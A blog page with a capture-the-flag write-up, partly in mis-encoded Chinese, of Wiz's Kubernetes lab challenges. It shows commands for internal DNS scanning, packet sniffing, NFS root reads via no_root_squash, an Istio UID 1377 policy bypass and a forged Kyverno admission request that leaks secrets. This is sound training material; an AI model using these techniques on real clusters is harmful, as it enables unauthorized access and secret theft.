<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>Sally's Blog</title><meta name="description" content="A simple and beautiful blog"><meta name="keywords" content="Blog,åšå®¢,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">ä¸»é¡µ</a></li><li> <a href="/archives">å½’æ¡£</a></li><li> <a href="/tags">æ ‡ç­¾</a></li><li> <a href="/about">å…³äº</a></li><li> <a href="/links">å‹é“¾</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> å…¨ç«™CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/04/04/%E4%BB%8EK8S-DNS-CTF%E7%9C%8B%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">ä»k8s-dns-ctfçœ‹äº‘åŸç”Ÿå®‰å…¨</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h1 id="Wiz-k8slanparty"><a href="#Wiz-k8slanparty" class="headerlink" title="Wiz-k8slanparty"></a>Wiz-k8slanparty</h1><h2 id="1-ç¬¬ä¸€éƒ¨åˆ†"><a href="#1-ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="1. ç¬¬ä¸€éƒ¨åˆ†"></a>1. ç¬¬ä¸€éƒ¨åˆ†</h2><h3 id="DNSing-with-the-stars-ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ-DNS-è§£æ"><a href="#DNSing-with-the-stars-ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ-DNS-è§£æ" class="headerlink" title="DNSing with the stars ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ DNS è§£æ"></a>DNSing with the stars ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ DNS è§£æ</h3><p>You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.</p>
<p>As a warmup, utilize <a target="_blank" rel="noopener" href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning</a> to uncover hidden internal services and obtain the flag. We have â€œloaded your machine with <a target="_blank" rel="noopener" href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">dnscan</a> to ease this process for further challenges.</p>
<p>æ‚¨å¯ä»¥é€šè¿‡ shell è®¿é—®æœ¬é¡µåº•éƒ¨çš„å—æ„ŸæŸ“ Kubernetes podï¼Œæ‚¨çš„ä¸‹ä¸€ä¸ªç›®æ ‡æ˜¯è¿›ä¸€æ­¥å±å®³å…¶ä»–å†…éƒ¨æœåŠ¡ã€‚</p>
<p>ä½œä¸ºçƒ­èº«ï¼Œåˆ©ç”¨ DNS æ‰«ææ¥å‘ç°éšè—çš„å†…éƒ¨æœåŠ¡å¹¶è·å–æ ‡å¿—ã€‚æˆ‘ä»¬å·²â€œåœ¨æ‚¨çš„æœºå™¨ä¸ŠåŠ è½½äº† dnscanï¼Œä»¥ç®€åŒ–æ­¤è¿‡ç¨‹ä»¥åº”å¯¹è¿›ä¸€æ­¥çš„æŒ‘æˆ˜ã€‚</p>
<h3 id="1-1-æŸ¥çœ‹ç¯å¢ƒå˜é‡"><a href="#1-1-æŸ¥çœ‹ç¯å¢ƒå˜é‡" class="headerlink" title="1.1 æŸ¥çœ‹ç¯å¢ƒå˜é‡"></a>1.1 æŸ¥çœ‹ç¯å¢ƒå˜é‡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404162220576.png" alt="image-20240404162220576"></p>
<h3 id="1-2-ä½¿ç”¨dnscanæ‰«æ"><a href="#1-2-ä½¿ç”¨dnscanæ‰«æ" class="headerlink" title="1.2 ä½¿ç”¨dnscanæ‰«æ"></a>1.2 ä½¿ç”¨dnscanæ‰«æ</h3><p>å‘ç°å…¶ä¸º10.100æ®µï¼Œæˆ‘ä»¬ä½¿ç”¨dnscanè¿›è¡Œæ‰«æ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscan -subnet 10.100.0.0/16</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404162707141.png" alt="image-20240404162707141"></p>
<p>æ‰«æåˆ°äº†å…³é”®æœåŠ¡getflag-serviceå’Œå†…éƒ¨IP10.100.136.254ï¼Œæˆ‘ä»¬ä½¿ç”¨curlè®¿é—®çœ‹çœ‹åˆ™è·å¾—flag</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404162834200.png" alt="image-20240404162834200"></p>
<h2 id="2-ç¬¬äºŒéƒ¨åˆ†"><a href="#2-ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="2. ç¬¬äºŒéƒ¨åˆ†"></a>2. ç¬¬äºŒéƒ¨åˆ†</h2><h3 id="Helloï¼Ÿä½ å¥½ï¼Ÿ"><a href="#Helloï¼Ÿä½ å¥½ï¼Ÿ" class="headerlink" title="Helloï¼Ÿä½ å¥½ï¼Ÿ"></a>Helloï¼Ÿä½ å¥½ï¼Ÿ</h3><p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/">sidecars</a> reporting sensitive secrets.</p>
<p>æœ‰æ—¶ï¼Œæˆ‘ä»¬ä¼¼ä¹æ˜¯å‘¨å›´å”¯ä¸€çš„äººï¼Œä½†æˆ‘ä»¬åº”è¯¥æ—¶åˆ»è­¦æƒ•éšå½¢çš„ sidecar æŠ¥å‘Šæ•æ„Ÿç§˜å¯†ã€‚</p>
<h3 id="1-1-ä½¿ç”¨dnscanæ‰«æ"><a href="#1-1-ä½¿ç”¨dnscanæ‰«æ" class="headerlink" title="1.1 ä½¿ç”¨dnscanæ‰«æ"></a>1.1 ä½¿ç”¨dnscanæ‰«æ</h3><p>å‘ç°äº†sidecaræœåŠ¡ï¼Œè¿™åŒæ—¶ä¹Ÿè¯æ˜å½“å‰podå­˜åœ¨ç€ä¸€ä¸ªâ€œé‚»å±…â€ï¼Œå®ƒå…±äº«ç€ä½ çš„ç½‘ç»œå’Œå­˜å‚¨ã€‚</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404165225554.png" alt="image-20240404165225554"></p>
<h3 id="1-2-ä½¿ç”¨tcpdumpæŸ¥çœ‹ç½‘å¡é€šä¿¡"><a href="#1-2-ä½¿ç”¨tcpdumpæŸ¥çœ‹ç½‘å¡é€šä¿¡" class="headerlink" title="1.2 ä½¿ç”¨tcpdumpæŸ¥çœ‹ç½‘å¡é€šä¿¡"></a>1.2 ä½¿ç”¨tcpdumpæŸ¥çœ‹ç½‘å¡é€šä¿¡</h3><p>å‘ç°é€šä¿¡è¿‡ç¨‹ä¸­åŒ…å«flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -X</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404165421962.png" alt="image-20240404165421962"></p>
<h2 id="3-ç¬¬ä¸‰éƒ¨åˆ†"><a href="#3-ç¬¬ä¸‰éƒ¨åˆ†" class="headerlink" title="3. ç¬¬ä¸‰éƒ¨åˆ†"></a>3. ç¬¬ä¸‰éƒ¨åˆ†</h2><h3 id="Exposed-File-Share-æš´éœ²çš„æ–‡ä»¶å…±äº«"><a href="#Exposed-File-Share-æš´éœ²çš„æ–‡ä»¶å…±äº«" class="headerlink" title="Exposed File Share æš´éœ²çš„æ–‡ä»¶å…±äº«"></a>Exposed File Share æš´éœ²çš„æ–‡ä»¶å…±äº«</h3><p>The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based ğŸ¤¦â€ï¸.</p>
<p>ç›®æ ‡å¤§å…¬å¸åœ¨ç”Ÿäº§ä¸­ä½¿ç”¨è¿‡æ—¶ä½†æ”¯æŒäº‘çš„æŠ€æœ¯è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚ä½†æ˜¯å¤©å“ªï¼Œè¿™é¡¹æŠ€æœ¯æ˜¯åœ¨è®¿é—®æ§åˆ¶ä»…åŸºäºç½‘ç»œçš„æ—¶ä»£å¼•å…¥çš„ğŸ¤¦â€ï¸ã€‚</p>
<h3 id="1-1-å¯»æ‰¾æ–‡ä»¶å…±äº«"><a href="#1-1-å¯»æ‰¾æ–‡ä»¶å…±äº«" class="headerlink" title="1.1 å¯»æ‰¾æ–‡ä»¶å…±äº«"></a>1.1 å¯»æ‰¾æ–‡ä»¶å…±äº«</h3><p>ä½¿ç”¨mountå‘½ä»¤æŸ¥çœ‹ï¼Œå‘ç°é™¤äº†overlayå¤–è¿˜æœ‰ä¸€ä¸ªefsæ–‡ä»¶æŒ‚è½½ï¼Œä»ä¸­å¯ä»¥çŸ¥é“æŒ‚è½½ç‚¹åœ¨&#x2F;efsã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404225814855.png" alt="image-20240404225814855"></p>
<p>æŸ¥çœ‹&#x2F;efsä¸‹æ–‡ä»¶ï¼Œå‘ç°flagä½†æ²¡æƒé™è¯»</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /efs</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404225926154.png" alt="image-20240404225926154"></p>
<h3 id="1-2-å¦‚ä½•ææƒ"><a href="#1-2-å¦‚ä½•ææƒ" class="headerlink" title="1.2 å¦‚ä½•ææƒ"></a>1.2 å¦‚ä½•ææƒ</h3><p>æˆ‘ä»¬çŸ¥é“nfså¯èƒ½é…ç½®no_root_squashï¼Œè¿™æ˜¯å…è®¸æˆ‘ä»¬é€šè¿‡æœåŠ¡å™¨ä»¥rootæƒé™è¯»å–æ–‡ä»¶çš„ï¼Œå°è¯•ä½¿ç”¨nfs-catçœ‹èƒ½ä¸èƒ½ä»æœåŠ¡å™¨è¯»ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nfs-cat <span class="string">&quot;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&amp;uid=0&amp;gid=0&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404230116167.png" alt="image-20240404230116167"></p>
<h2 id="3-ç¬¬ä¸‰éƒ¨åˆ†-1"><a href="#3-ç¬¬ä¸‰éƒ¨åˆ†-1" class="headerlink" title="3. ç¬¬ä¸‰éƒ¨åˆ†"></a>3. ç¬¬ä¸‰éƒ¨åˆ†</h2><h3 id="The-Beauty-and-The-Ist-ç¾ä¸å®"><a href="#The-Beauty-and-The-Ist-ç¾ä¸å®" class="headerlink" title="The Beauty and The Ist ç¾ä¸å®"></a>The Beauty and The Ist ç¾ä¸å®</h3><p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Donâ€™t abuse this power; use it responsibly and with caution.</p>
<p>æ˜¾ç„¶ï¼Œæ–°çš„æœåŠ¡ç½‘æ ¼æŠ€æœ¯å¯¹è¶…çº§ç²¾è‹±ç”¨æˆ·ï¼ˆrootç”¨æˆ·ï¼‰å…·æœ‰ç‹¬ç‰¹çš„å¸å¼•åŠ›ã€‚è¯·å‹¿æ»¥ç”¨æ­¤æƒåŠ›ï¼›è´Ÿè´£ä»»ä¸”è°¨æ…åœ°ä½¿ç”¨å®ƒã€‚</p>
<h3 id="1-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"><a href="#1-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™" class="headerlink" title="1.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"></a>1.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">security.istio.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">AuthorizationPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">istio-get-flag</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">k8s-lan-party</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">action:</span> <span class="string">DENY</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">&quot;&#123;flag-pod-name&#125;&quot;</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">from:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source:</span></span><br><span class="line">        <span class="attr">namespaces:</span> [<span class="string">&quot;k8s-lan-party&quot;</span>]</span><br><span class="line">    <span class="attr">to:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">operation:</span></span><br><span class="line">        <span class="attr">methods:</span> [<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span><br></pre></td></tr></table></figure>

<ol>
<li>å¦‚æœä½ çš„è¯·æ±‚æ¥è‡ª <code>k8s-lan-party</code> å‘½åç©ºé—´ï¼Œå¹¶ä¸”ä½¿ç”¨äº† <code>POST</code> æˆ– <code>GET</code> æ–¹æ³•ï¼Œé‚£ä¹ˆä½ çš„è¯·æ±‚å°†è¢«å…è®¸é€šè¿‡ã€‚</li>
<li>é™¤éä½ çš„è¯·æ±‚æ¥è‡ª <code>k8s-lan-party</code> å‘½åç©ºé—´ä¸”æ–¹æ³•ä¸º <code>POST</code> æˆ– <code>GET</code>ï¼Œå¦åˆ™ä»»ä½•æ¥è‡ªæ ‡ç­¾åŒ¹é…ä¸º <code>app: &quot;&#123;flag-pod-name&#125;&quot;</code> çš„ Pod çš„è¯·æ±‚éƒ½å°†è¢«æ‹’ç»ã€‚</li>
</ol>
<h3 id="1-2-ä½¿ç”¨dnsæ‰«æ"><a href="#1-2-ä½¿ç”¨dnsæ‰«æ" class="headerlink" title="1.2 ä½¿ç”¨dnsæ‰«æ"></a>1.2 ä½¿ç”¨dnsæ‰«æ</h3><p>æˆ‘ä»¬ä½¿ç”¨dnscanè¿›è¡Œæ‰«æï¼Œå‘ç°istioæœåŠ¡ï¼Œä½†æƒé™ä¸å¤Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscan -subnet 10.100.0.0/16</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405102135213.png" alt="image-20240405102135213"></p>
<h3 id="1-3-åˆ©ç”¨1377-UID-bypass"><a href="#1-3-åˆ©ç”¨1377-UID-bypass" class="headerlink" title="1.3 åˆ©ç”¨1377 UID bypass"></a>1.3 åˆ©ç”¨1377 UID bypass</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://istio.io/latest/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf">https://istio.io/latest/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf</a></p>
<p>æŸ¥çœ‹ä¸€ä¸‹rootçš„æƒé™ï¼Œä¹Ÿå°±åªæœ‰cap_setgidå’Œcap_setuidï¼Œä¸è¿‡åˆšå¥½å¯ä»¥ä½¿ç”¨æ¥bypassã€‚</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405113243258.png" alt="image-20240405113243258"></p>
<p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ·ï¼Œåˆ©ç”¨uidä¸º1377çš„istioç”¨æˆ·å¯ä»¥å®ç°ç»•è¿‡RBACè®¿é—®istioæœåŠ¡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405102310097.png" alt="image-20240405102310097"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su istio <span class="comment"># åˆ‡æ¢åˆ°istioç”¨æˆ·</span></span><br><span class="line">curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405102429900.png" alt="image-20240405102429900"></p>
<h2 id="4-ç¬¬å››éƒ¨åˆ†"><a href="#4-ç¬¬å››éƒ¨åˆ†" class="headerlink" title="4. ç¬¬å››éƒ¨åˆ†"></a>4. ç¬¬å››éƒ¨åˆ†</h2><h3 id="Who-will-guard-the-guardians-è°æ¥å®ˆæŠ¤å®ˆæŠ¤è€…ï¼Ÿ"><a href="#Who-will-guard-the-guardians-è°æ¥å®ˆæŠ¤å®ˆæŠ¤è€…ï¼Ÿ" class="headerlink" title="Who will guard the guardians? è°æ¥å®ˆæŠ¤å®ˆæŠ¤è€…ï¼Ÿ"></a>Who will guard the guardians? è°æ¥å®ˆæŠ¤å®ˆæŠ¤è€…ï¼Ÿ</h3><p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">administrative</a> services.</p>
<p>å½“ Pod å—åˆ°å¤–éƒ¨æ”¿æƒçš„å˜å¼‚æ—¶ï¼Œå¯ä»¥æ»¥ç”¨å…¶å®˜åƒšæœºæ„å¹¶ä»ç®¡ç†æœåŠ¡ä¸­æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚</p>
<h3 id="1-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™-1"><a href="#1-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™-1" class="headerlink" title="1.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"></a>1.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">apply-flag-to-env</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">sensitive-ns</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">inject-env-vars</span></span><br><span class="line">      <span class="attr">match:</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Pod</span></span><br><span class="line">      <span class="attr">mutate:</span></span><br><span class="line">        <span class="attr">patchStrategicMerge:</span></span><br><span class="line">          <span class="attr">spec:</span></span><br><span class="line">            <span class="attr">containers:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="attr">env:</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">FLAG</span></span><br><span class="line">                    <span class="attr">value:</span> <span class="string">&quot;&#123;flag&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>è¿™é‡Œå°†flagå†™å…¥äº†æ¯ä¸ªsensitive-nså‘½åç©ºé—´çš„podçš„envä¸­</li>
</ul>
<h3 id="1-2-ä½¿ç”¨dnscanæ‰«æ-1"><a href="#1-2-ä½¿ç”¨dnscanæ‰«æ-1" class="headerlink" title="1.2 ä½¿ç”¨dnscanæ‰«æ"></a>1.2 ä½¿ç”¨dnscanæ‰«æ</h3><p>å¯ä»¥çœ‹åˆ°kyvernoæœåŠ¡å’Œ5ä¸ªmetricsæœåŠ¡</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405110128178.png" alt="image-20240405110128178"></p>
<h3 id="1-3-ä½¿ç”¨mutateç«¯ç‚¹å‘é€åˆ›å»ºpodè¯·æ±‚"><a href="#1-3-ä½¿ç”¨mutateç«¯ç‚¹å‘é€åˆ›å»ºpodè¯·æ±‚" class="headerlink" title="1.3 ä½¿ç”¨mutateç«¯ç‚¹å‘é€åˆ›å»ºpodè¯·æ±‚"></a>1.3 ä½¿ç”¨mutateç«¯ç‚¹å‘é€åˆ›å»ºpodè¯·æ±‚</h3><p>ç”±äºsensitive-nså‘½åç©ºé—´ä¸­æ¯ä¸ªpodçš„envéƒ½ä¼šè¢«å†™å…¥flagï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªç«¯ç‚¹æ¥åˆ›å»ºä¸€ä¸ªpodã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k -X POST https://kyverno-svc.kyverno.svc.cluster.local./mutate -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data <span class="string">&#x27;&#123;&quot;apiVersion&quot;:&quot;admission.k8s.io/v1&quot;,&quot;kind&quot;:&quot;AdmissionReview&quot;,&quot;request&quot;:&#123;&quot;uid&quot;:&quot;705ab4f5-6393-11e8-b7cc-42010a800002&quot;,&quot;kind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;resource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;requestKind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;requestResource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;,&quot;operation&quot;:&quot;CREATE&quot;,&quot;userInfo&quot;:&#123;&quot;username&quot;:&quot;admin&quot;,&quot;uid&quot;:&quot;014fbff9a07c&quot;,&quot;groups&quot;:[&quot;system:authenticated&quot;]&#125;,&quot;object&quot;:&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;name&quot;:&quot;example-container&quot;,&quot;image&quot;:&quot;nginx&quot;,&quot;env&quot;:[&#123;&quot;name&quot;:&quot;FLAG&quot;,&quot;value&quot;:&quot;&#123;flag&#125;&quot;&#125;]&#125;]&#125;&#125;,&quot;oldObject&quot;:null,&quot;options&quot;:&#123;&quot;apiVersion&quot;:&quot;meta.k8s.io/v1&quot;,&quot;kind&quot;:&quot;CreateOptions&quot;&#125;,&quot;dryRun&quot;:true&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>patchæ®µbase64è§£ç åå³å¯è·å¾—flag</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405110750755.png" alt="image-20240405110750755"></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-04-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 1461 words, 4 min 52 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/04/02/%E4%BB%8EIAM-CTF%E7%9C%8B%E4%BA%91%E8%BA%AB%E4%BB%BD%E5%AE%89%E5%85%A8/">ä»IAM-CTFçœ‹äº‘èº«ä»½å®‰å…¨</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h1 id="Wiz-thebigiamchallenge"><a href="#Wiz-thebigiamchallenge" class="headerlink" title="Wiz-thebigiamchallenge"></a>Wiz-thebigiamchallenge</h1><h2 id="1-ç¬¬ä¸€éƒ¨åˆ†"><a href="#1-ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="1. ç¬¬ä¸€éƒ¨åˆ†"></a>1. ç¬¬ä¸€éƒ¨åˆ†</h2><h3 id="Buckets-of-Fun-å­˜å‚¨æ¡¶çš„ä¹è¶£"><a href="#Buckets-of-Fun-å­˜å‚¨æ¡¶çš„ä¹è¶£" class="headerlink" title="Buckets of Fun å­˜å‚¨æ¡¶çš„ä¹è¶£"></a>Buckets of Fun å­˜å‚¨æ¡¶çš„ä¹è¶£</h3><p>We all know that public buckets are risky. But can you find the flag?</p>
